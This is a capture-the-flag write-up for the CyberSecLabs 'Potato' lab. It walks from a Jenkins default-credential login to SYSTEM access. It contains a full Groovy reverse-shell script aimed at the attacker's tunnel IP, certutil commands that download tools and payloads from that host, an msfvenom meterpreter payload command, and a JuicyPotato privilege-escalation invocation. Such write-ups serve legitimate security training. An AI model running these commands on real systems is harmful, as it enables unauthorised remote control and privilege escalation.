# Solving [CyberSecLabs-Potato](https://www.cyberseclabs.co.uk/labs/info/Potato/)
* [Nmap](https://github.com/nmap/nmap) scan shows many ports are up but `8080` is running [Jetty](https://www.eclipse.org/jetty/)
* Jenkins is hosted on jetty with default username and password equal to `admin`
* Following [this](https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins) brings me to machine_ip:8080/script where we can write a groovy script for a reverse-shell
```cmd
String host="TUN_IP";
int port=1337;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
* Using [winPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) to check for possible exploit options (`certutil` is used for downloading)
* On attack machine `python3 -m http.server 80 `
* On victim machine `certutil.exe -urlcache -split -f "http://TUN_IP:80/wp.exe"`
* Among all the other stuff, SeImpersonatePrivilege is marked red in winPeas output
```
[+] Current Token privileges
SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
```
* Searching about it says that it can be exploited via kernal-level exploit called [JuicyPotato](https://github.com/ohpe/juicy-potato)
* Juicypotato needs an executable which gives us rev-shell which we generated with [msfvenom](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=TUN_IP LPORT=4444 -f exe > rev.exe
```
* Downloading rev.exe and juicypotato.exe(jp.exe) on victim machine
```
certutil.exe -urlcache -split -f "http://TUN_IP:80/jp.exe"
certutil.exe -urlcache -split -f "http://TUN_IP:80/rev.exe"
```
* `.\jp.exe -h` tells three arguments are compulsory: `-t`, `-l`, and `-p`
* Following gives us meterpreter with NTAuthority access
`.\jp.exe -t * -l 4444 -p rev.exe`
